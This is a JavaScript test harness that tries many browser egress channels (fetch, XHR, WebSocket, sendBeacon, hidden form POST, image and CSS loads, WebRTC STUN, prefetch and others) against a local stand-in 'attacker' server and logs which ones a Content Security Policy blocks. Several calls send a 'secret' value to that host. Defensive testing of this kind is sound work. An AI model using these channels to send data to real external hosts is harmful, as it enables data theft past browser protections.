'use strict';
// Document-context egress attempts against the "attacker" server. Every attempt hits a unique path
// /hit/<tag>/<kind>, so the attacker log says exactly which attempts got out. The client-side outcome
// recorded here is only informational; the attacker log is the source of truth.
async function runDocEgress(tag) {
  const X = 'http://localhost:8103/hit/' + tag + '/';
  const out = {};
  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.effectiveDirective} blocked ${e.blockedURI}`));
  const T = (p, ms = 2500) => Promise.race([p, new Promise((r) => setTimeout(() => r('timeout (no event)'), ms))]);
  const rec = async (name, fn) => { try { out[name] = await T(fn()); } catch (e) { out[name] = `throws ${e.name}: ${e.message}`.slice(0, 160); } };
  const el = (tagName, props, events = true) => new Promise((res) => {
    const e = document.createElement(tagName);
    if (events) { e.onload = () => res('load event'); e.onerror = () => res('error event'); }
    Object.assign(e, props);
    (tagName === 'link' || tagName === 'script' ? document.head : document.body).appendChild(e);
    if (!events) setTimeout(() => res('inserted'), 400);
  });

  await rec('fetch', async () => { const r = await fetch(X + 'fetch?d=secret'); return 'ok status ' + r.status; });
  await rec('fetch-nocors', async () => { await fetch(X + 'fetch-nocors', { mode: 'no-cors', method: 'POST', body: 'secret' }); return 'ok (opaque)'; });
  await rec('xhr', () => new Promise((res) => { const x = new XMLHttpRequest(); x.open('GET', X + 'xhr'); x.onload = () => res('ok status ' + x.status); x.onerror = () => res('error event'); x.send(); }));
  await rec('websocket', () => new Promise((res) => {
    const ws = new WebSocket('ws://localhost:8103/hit/' + tag + '/websocket');
    ws.onopen = () => { res('open'); ws.close(); };
    ws.onerror = () => res('error event');
  }));
  await rec('eventsource', () => new Promise((res) => { const es = new EventSource(X + 'sse'); es.onmessage = () => { res('message'); es.close(); }; es.onerror = () => { res('error event'); es.close(); }; }));
  await rec('dynamic-import', async () => { await import(X + 'import'); return 'imported'; });
  await rec('script-tag', () => el('script', { src: X + 'script' }));
  await rec('image', () => new Promise((res) => { const i = new Image(); i.onload = () => res('load event'); i.onerror = () => res('error event'); i.src = X + 'image?d=secret'; }));
  await rec('css-background', async () => { const d = document.createElement('div'); d.style.cssText = `width:10px;height:10px;background-image:url(${X}css-bg)`; document.body.appendChild(d); await new Promise((r) => setTimeout(r, 400)); return 'inserted'; });
  await rec('stylesheet-link', () => el('link', { rel: 'stylesheet', href: X + 'css' }));
  await rec('sendBeacon', async () => 'returned ' + navigator.sendBeacon(X + 'beacon', 'secret'));
  await rec('iframe-embed', () => el('iframe', { src: X + 'iframe' }));
  await rec('object', () => el('object', { data: X + 'object', type: 'text/html' }));
  await rec('video', () => el('video', { src: X + 'video' }));
  await rec('link-prefetch', () => el('link', { rel: 'prefetch', href: X + 'prefetch' }, false));
  await rec('link-preload', () => el('link', { rel: 'preload', as: 'fetch', crossOrigin: 'anonymous', href: X + 'preload' }, false));
  await rec('form-submit', async () => {
    const f = document.createElement('iframe'); f.name = 'egress-form-target-' + tag; f.style.display = 'none'; document.body.appendChild(f);
    const form = document.createElement('form'); form.action = X + 'form'; form.method = 'POST'; form.target = f.name;
    const i = document.createElement('input'); i.name = 'd'; i.value = 'secret'; form.appendChild(i);
    document.body.appendChild(form); form.submit();
    await new Promise((r) => setTimeout(r, 500));
    return 'submitted';
  });
  await rec('webrtc-stun', async () => {
    if (typeof RTCPeerConnection === 'undefined') return 'RTCPeerConnection undefined';
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:8103' }] });
    pc.createDataChannel('x');
    const cands = [];
    const done = new Promise((r) => { pc.onicecandidate = (e) => { if (e.candidate) cands.push(e.candidate.type); else r(); }; setTimeout(r, 2000); });
    await pc.setLocalDescription(await pc.createOffer());
    await done;
    pc.close();
    return `ice candidates: [${cands.join(',')}]`;
  });
  await new Promise((r) => setTimeout(r, 300));
  return { out, violations };
}
// preconnect has no request path; the runner compares the attacker's TCP connection counter.
function runPreconnect() {
  const l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'http://localhost:8103'; document.head.appendChild(l);
  return new Promise((r) => setTimeout(() => r('inserted'), 800));
}
